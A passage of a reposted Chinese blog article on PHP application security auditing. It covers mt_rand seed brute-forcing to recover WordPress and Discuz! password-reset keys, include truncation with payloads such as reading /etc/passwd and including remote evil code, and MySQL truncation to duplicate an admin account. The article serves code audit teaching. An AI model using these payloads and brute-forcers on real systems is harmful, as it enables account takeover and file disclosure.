class="string">"\n"</span>;	</div><div class="line">	</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_generate_password</span><span class="params">($length = <span class="number">12</span>, $special_chars = true)</span> </span>&#123;</div><div class="line">	$chars = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</div><div class="line">	<span class="keyword">if</span> ( $special_chars )</div><div class="line">		$chars .= <span class="string">'!@#$%^&amp;*()'</span>;</div><div class="line"></div><div class="line">	$password = <span class="string">''</span>;</div><div class="line">	<span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</div><div class="line">		$password .= substr($chars, mt_rand(<span class="number">0</span>, strlen($chars) - <span class="number">1</span>), <span class="number">1</span>);</div><div class="line">	<span class="keyword">return</span> $password;</div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getseed</span><span class="params">($resetkey)</span> </span>&#123;</div><div class="line">	$max = pow(<span class="number">2</span>,(<span class="number">32</span>-BUGGY));</div><div class="line">	<span class="keyword">for</span>($x=<span class="number">0</span>;$x&lt;=$max;$x++) &#123;</div><div class="line">		$seed = BUGGY ? ($x &lt;&lt; <span class="number">1</span>) + <span class="number">1</span> : $x; </div><div class="line">		mt_srand($seed);</div><div class="line">		$testkey = wp_generate_password(<span class="number">20</span>,<span class="keyword">false</span>);</div><div class="line">		<span class="keyword">if</span>($testkey==$resetkey) &#123; <span class="keyword">echo</span> <span class="string">"o\n"</span>; <span class="keyword">return</span> $seed; &#125;</div><div class="line"></div><div class="line">		<span class="keyword">if</span>(!($x % <span class="number">10000</span>)) <span class="keyword">echo</span> $x / <span class="number">10000</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>运行结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">php5&gt;php rand.php</div><div class="line">M8pzpjwCrvVt3oobAaOr</div><div class="line">0123456789101112131415161718192021222324252627282930313233343536373839404142434</div><div class="line">445464748495051525354555657585960616263646566676869</div><div class="line">7071727374757677787980818283848586878889909192939495969798991001011021031041051</div><div class="line">061071081091101111121131141151161171181191201211221</div><div class="line">2312412512612712812913013113213313413513613713813914014114214314414514614714814</div><div class="line">915015115215315415515615715815916016116216316416516</div><div class="line">6167168169170171172173174175176177178179180181182183184185186187188189190191192</div><div class="line">193194195196197198199200201202203204205206207208209</div><div class="line">2102112122132142152162172182192202212222232242252262272282292302312322332342352</div><div class="line">362372382392402412422432442452462472482492502512522</div><div class="line">..............01062110622106231062410625106261062710628106291063010631106321063</div><div class="line">3o</div><div class="line">70693</div><div class="line">pjwCrvVt3oobAaOr</div></pre></td></tr></table></figure>
+<p>当10634次时候我们得到了结果。</p>
+<p>当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">mt_srand(<span class="number">42</span>);</div><div class="line"><span class="keyword">echo</span> mt_rand();</div><div class="line"><span class="comment">//php&lt;=5.20 1387371436</span></div><div class="line"><span class="comment">//php&gt;5.20 1354439493 		</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>正是这个原因，也要求了我们的exp的运行环境：当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，反过来也是一样。</p>
+<p>从上面的测试及分析来看，php&lt;5.26不管有没有定义播种，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等，这样的后果就是被攻击者恶意利用直接修改密码。</p>
+<p>很多著名的程序都产生了类似的漏洞如wordpress、phpbb、punbb等等。（在后面我们将实际分析下国内著名的bbs程序Discuz!的mt_srand导致的漏洞）</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：php4 php5&lt;5.2.6</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：查找mt_srand/mt_rand</td>
+</tr>
+</tbody>
+</table>
+<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><hr>
+<p>其实“特殊字符”也没有特定的标准定义，主要是在一些code hacking发挥着特殊重作用的一类字符。下面就举几个例子：</p>
+<h3 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h3><p>其中最有名的数大家都熟悉的null字符截断。</p>
+<h4 id="include截断"><a href="#include截断" class="headerlink" title="include截断"></a>include截断</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">include</span> $_GET[<span class="string">'action'</span>].<span class="string">".php"</span>; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=<code>http://www.hacksite.com/evil-code.txt</code>?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">////////////////////</span></div><div class="line"><span class="comment">////var5.php代码:</span></div><div class="line"><span class="comment">////include $_GET['action'].".php"; </span></div><div class="line"><span class="comment">////print strlen(realpath("./"))+strlen($_GET['action']);  </span></div><div class="line"><span class="comment">///////////////////</span></div><div class="line">ini_set(<span class="string">'max_execution_time'</span>, <span class="number">0</span>);</div><div class="line">$str=<span class="string">''</span>;</div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">50000</span>;$i++)</div><div class="line">&#123;</div><div class="line">	$str=$str.<span class="string">"/"</span>;</div><div class="line"></div><div class="line">	$resp=file_get_contents(<span class="string">'http://127.0.0.1/var/var5.php?action=1.txt'</span>.$str);</div><div class="line">	<span class="comment">//1.txt里的代码为print 'hi';</span></div><div class="line">	<span class="keyword">if</span> (strpos($resp, <span class="string">'hi'</span>) !== <span class="keyword">false</span>)&#123;</div><div class="line">		<span class="keyword">print</span> $i;</div><div class="line">		<span class="keyword">exit</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和<code>*</code>nix的系统长度不一样，当win下strlen(realpath(“./“))+strlen($<code>_</code>GET<code>[&#39;action&#39;]</code>)的长度大于256时被截断，对于<code>*</code>nix的长度是4 <code>*</code> 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）</p>
+<h4 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h4><p>对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。</p>
+<p><em>1) Mysql SQL Column Truncation Vulnerabilities</em></p>
+<p>这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：<br>​    </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">mysql&gt; insert into truncated_test(`username`,`password`) values("admin","pass");</div><div class="line"></div><div class="line">mysql&gt; insert into truncated_test(`username`,`password`) values("admin           x", "new_pass");</div><div class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from truncated_test;</div><div class="line">+----+------------+----------+</div><div class="line">| id | username   | password |</div><div class="line">+----+------------+----------+</div><div class="line">| 1 | admin      | pass     |</div><div class="line">| 2 | admin      | new_pass |</div><div class="line">+----+------------+----------+</div><div class="line">2 rows in set (0.00 sec)</div></pre></td></tr></table></figure>
+<p><em>2) Mysql charset Truncation vulnerability</em></p>
+<p>这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：<br>​    </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");</div><div class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from truncated_test;</div><div class="line">+----+------------+----------+</div><div class="line">| id | username   | password |</div><div class="line">+----+------------+----------+</div><div class="line">| 1 | admin      | pass      |</div><div class="line">| 2 | admin      | new_pass  |</div><div class="line">| 3 | admin      | new_pass2 |</div><div class="line">+----+------------+----------+</div><div class="line">2 rows in set (0.00 sec)</div></pre></td></tr></table></figure>
+<p>很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$result = mysql_query(<span class="string">"SELECT * from test_user where user='$user' "</span>);</div><div class="line">  ....</div><div class="line"><span class="keyword">if</span>(@mysql_fetch_array($result, MYSQL_NUM)) &#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"already exist"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：通读代码</td>
+</tr>
+</tbody>
+</table>
+<h4 id="文件操作里的特殊字符"><a href="#文件操作里的特殊字符" class="headerlink" title="文件操作里的特殊字符"></a>文件操作里的特殊字符</h4><p>文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“...\”进行系统转跳等等。<br>​<br>下面还给大家介绍一个非常有意思的问题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Is this code vul?</span></div><div class="line"><span class="keyword">if</span>( eregi(<span class="string">".php"</span>,$url) )&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"ERR"</span>);</div><div class="line">&#125;</div><div class="line">$fileurl=str_replace($webdb[www_url],<span class="string">""</span>,$url);</div><div class="line">.....</div><div class="line">header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);</div></pre></td></tr></table></figure>
+<p>很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb[www_url]为空，那么我们提交“.p$webdb[www_url]hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$fileurl=str_replace($webdb[www_url],<span class="string">""</span>,$url);</div><div class="line"><span class="keyword">if</span>( eregi(<span class="string">".php"</span>,$url) )&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">"ERR"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">255</span>;$i++) &#123;</div><div class="line">	$url = <span class="string">'1.ph'</span>.chr($i);</div><div class="line">	$tmp = @file_get_contents($url);</div><div class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($i).<span class="string">"\r\n"</span>;</div><div class="line">&#125;  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>我们在windows系统运行上面的代码得到如下字符<code>*</code> &lt; &gt; ? P p都可以打开目录下的1.php。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><em>漏洞审计策略</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">PHP版本要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求：无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略：文读取件操作函数</td>
+</tr>
+</tbody>
+</table>
+<h3 id="怎么进一步寻找新的字典"><a href="#怎么进一步寻找新的字典" class="headerlink" title="怎么进一步寻找新的字典"></a>怎么进一步寻找新的字典</h3><p>上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？</p>
+<ul>
+<li>分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典</li>
+<li>通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式</li>
+<li>fuzz php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分很多都可以简单的fuzz脚本可以测试出来</li>
+<li>分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会陆续公布一些我们对php源代码的分析）</li>
+<li>有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽视的问题</li>
+<li>你有什么要补充的吗？ ：）</li>
+</ul>
+<h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><table>
+<thead>
+<tr>
+<th style="text-align:left"><em>DEMO</em></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">*DEMO – Discuz! Reset User Password 0day Vulnerability 分析</td>
+</tr>
+<tr>
+<td style="text-align:left">（Exp:[<a href="http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]）*" target="_blank" rel="external">http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]）*</a></td>
+</tr>
+<tr>
+<td style="text-align:left">PHP版本要求:php4 php5&lt;5.2.6</td>
+</tr>
+<tr>
+<td style="text-align:left">系统要求: 无</td>
+</tr>
+<tr>
+<td style="text-align:left">审计策略:查找mt_srand/mt_rand</td>
+</tr>
+</tbody>
+</table>
+<p>第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">heige@heige-desktop:~/dz6/upload$ grep -in &apos;mt_srand&apos; -r ./ --colour -5</div><div class="line">./include/global.func.php-694-  $GLOBALS[&apos;rewritecompatible&apos;] &amp;&amp; $name = rawurlencode($name);</div><div class="line">./include/global.func.php-695-  return &apos;&lt;a href=&quot;tag-&apos;.$name.&apos;.html&quot;&apos;.stripslashes($extra).&apos;&gt;&apos;;</div><div class="line">./include/global.func.php-696-&#125;</div><div class="line">./include/global.func.php-697-</div><div class="line">./include/global.func.php-698-function random($length, $numeric = 0) &#123;</div><div class="line">./include/global.func.php:699:  PHP_VERSION &lt; &apos;4.2.0&apos; &amp;&amp; mt_srand((double)microtime() * 1000000);</div><div class="line">./include/global.func.php-700-  if($numeric) &#123;</div><div class="line">./include/global.func.php-701-          $hash = sprintf(&apos;%0&apos;.$length.&apos;d&apos;, mt_rand(0, pow(10, $length) - 1));</div><div class="line">./include/global.func.php-702-  &#125; else &#123;</div><div class="line">./include/global.func.php-703-          $hash = &apos;&apos;;</div><div class="line">./include/global.func.php-704-          $chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&apos;;</div><div class="line">--</div><div class="line">./include/discuzcode.func.php-30-</div><div class="line">./include/discuzcode.func.php-31-if(!isset($_DCACHE[&apos;bbcodes&apos;]) | !is_array($_DCACHE[&apos;bbcodes&apos;]) | !is_array($_DCACHE[&apos;smilies&apos;])) &#123;</div><div class="line">./include/discuzcode.func.php-32-       @include DISCUZ_ROOT.&apos;./forumdata/cache/cache_bbcodes.php&apos;;</div><div class="line">./include/discuzcode.func.php-33-&#125;</div><div class="line">./include/discuzcode.func.php-34-</div><div class="line">./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);</div><div class="line">./include/discuzcode.func.php-36-</div><div class="line">./include/discuzcode.func.php-37-function attachtag($pid, $aid, &amp;$postlist) &#123;</div><div class="line">./include/discuzcode.func.php-38-       global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;</div><div class="line">./include/discuzcode.func.php-39-       $attach = $postlist[$pid][&apos;attachments&apos;][$aid];</div><div class="line">./include/discuzcode.func.php-40-       if($attach[&apos;attachimg&apos;]) &#123;</div></pre></td></tr></table></figure>
+<p>有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PHP_VERSION &lt; &apos;4.2.0&apos; &amp;&amp; mt_srand((double)microtime() * 1000000);</div></pre></td></tr></table></figure>
+<p>判断了版本，如果是PHP_VERSION &gt; ‘4.2.0’使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况：</p>
+<p>1) ‘Cross Application Attacks’ 这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() <code>*</code> 1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);</div></pre></td></tr></table></figure>
+<p>这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]）</p>
+<p>2) 有的人认为如果没有mt_srand((double)microtime() <code>*</code> 1000000);这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用’Cross Application Attacks’，5.2.6&gt;php&gt;4.2.0 php本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。</p>
+<h3 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h3><p>本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡献了不少新发现。</p>
+<p>另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。</p>
+<p>本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！</p>
+<h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>[1] (<a href="http://bbs.phpchina.com/attachment.php?aid=22294" target="_blank" rel="external">http://bbs.phpchina.com/attachment.php?aid=22294</a>)<br>[2] ([<a href="http://www.php-security.org/" target="_blank" rel="external">http://www.php-security.org/</a>)<br>[3] (<a href="http://bugs.php.net/bug.php?id=40114" target="_blank" rel="external">http://bugs.php.net/bug.php?id=40114</a>)</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/28/密码破解系列/" rel="next" title="密码破解系列">
+                <i class="fa fa-chevron-left"></i> 密码破解系列
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/10/31/转载-高级PHP应用程序漏洞审核技术/"
+           data-title="[转载]高级PHP应用程序漏洞审核技术" data-url="http://zer0yu.github.io/2017/10/31/转载-高级PHP应用程序漏洞审核技术/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="ZEROYU" />
+          <p class="site-author-name" itemprop="name">ZEROYU</p>
+          <p class="site-description motion-element" itemprop="description">一只单线程HACKER</p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">33</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/zer0yu" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/Z3r0yu" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="zeroyu.xyz@gmail.com" target="_blank" title="Email">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Email
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.csdn.net/zeroyu_xyz" title="我的CSDN博客" target="_blank">我的CSDN博客</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#高级PHP应用程序漏洞审核技术"><span class="nav-number">1.</span> <span class="nav-text">高级PHP应用程序漏洞审核技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#传统的代码审计技术"><span class="nav-number">1.2.</span> <span class="nav-text">传统的代码审计技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP版本与应用代码审计"><span class="nav-number">1.3.</span> <span class="nav-text">PHP版本与应用代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他的因素与应用代码审计"><span class="nav-number">1.4.</span> <span class="nav-text">其他的因素与应用代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扩展我们的字典"><span class="nav-number">1.5.</span> <span class="nav-text">扩展我们的字典</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量本身的key"><span class="nav-number">1.6.</span> <span class="nav-text">变量本身的key</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量覆盖"><span class="nav-number">1.7.</span> <span class="nav-text">变量覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#遍历初始化变量"><span class="nav-number">1.8.</span> <span class="nav-text">遍历初始化变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#parse-str-变量覆盖漏洞"><span class="nav-number">1.9.</span> <span class="nav-text">parse_str()变量覆盖漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#import-request-variables-变量覆盖漏洞"><span class="nav-number">1.10.</span> <span class="nav-text">import_request_variables()变量覆盖漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP5-Globals"><span class="nav-number">1.11.</span> <span class="nav-text">PHP5 Globals</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#magic-quotes-gpc与代码安全"><span class="nav-number">1.12.</span> <span class="nav-text">magic_quotes_gpc与代码安全</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是magic-quotes-gpc"><span class="nav-number">1.13.</span> <span class="nav-text">什么是magic_quotes_gpc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#哪些地方没有魔术引号的保护"><span class="nav-number">1.14.</span> <span class="nav-text">哪些地方没有魔术引号的保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量的编码与解码"><span class="nav-number">1.15.</span> <span class="nav-text">变量的编码与解码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次攻击"><span class="nav-number">1.16.</span> <span class="nav-text">二次攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#魔术引号带来的新的安全问题"><span class="nav-number">1.17.</span> <span class="nav-text">魔术引号带来的新的安全问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量key与魔术引号"><span class="nav-number">1.18.</span> <span class="nav-text">变量key与魔术引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码注射"><span class="nav-number">1.19.</span> <span class="nav-text">代码注射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP中可能导致代码注射的函数"><span class="nav-number">1.20.</span> <span class="nav-text">PHP中可能导致代码注射的函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量函数与双引号"><span class="nav-number">1.21.</span> <span class="nav-text">变量函数与双引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 